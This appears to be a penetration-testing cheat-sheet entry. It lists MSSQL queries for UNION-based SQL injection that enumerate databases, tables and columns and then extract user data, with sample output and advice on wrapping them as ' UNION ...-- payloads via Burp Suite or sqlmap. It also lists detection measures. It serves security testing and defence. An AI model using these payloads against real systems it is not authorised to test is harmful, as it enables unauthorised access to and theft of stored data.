---
type: code
language: sql
verified: true
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Windows
tags:
  - sql-injection
  - enumeration
validated: true
---

# MSSQL Union Based Enumeration Queries

## Code

```sql
-- extract databases names
$ SELECT name FROM master..sysdatabases
[*] Injection
[*] msdb
[*] tempdb

-- extract tables from Injection database
$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
[*] Profiles
[*] Roles
[*] Users

-- extract columns for the table Users
$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
[*] UserId
[*] UserName

-- Finally extract the data
$ SELECT  UserId, UserName from Users
```

## Description

This SQL code snippet contains a sequence of queries for UNION-based injection to enumerate MSSQL databases, tables, columns, and data. It includes example outputs and is designed as a reference for building injection payloads step-by-step.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $ | Prompt indicator in examples | N/A |
| [*] | Output line prefix | N/A |
| Injection | Target database name (replace as needed) | Injection |
| Users | Target table name (replace as needed) | Users |
| UserId, UserName | Sample columns (replace with actual) | UserId, UserName |

## Usage

Use these queries in a UNION SELECT payload on a vulnerable input field, e.g., ' UNION [query]--. Start with database enumeration, then drill down to tables and data. Integrate with tools like Burp Suite for manual injection or sqlmap for automation. Ideal for web app pentesting where MSSQL is the backend.

## Detection

- Monitor database logs for queries accessing sysdatabases, sysobjects, or syscolumns from untrusted sources.
- WAF rules matching UNION SELECT patterns or anomalous SELECT counts.
- Anomalous data access patterns, like full table scans on system views.
- Enable extended events in MSSQL to trace injection attempts.

## Related

- [[procedures/mssql-union-based-injection-for-database-enumeration]]
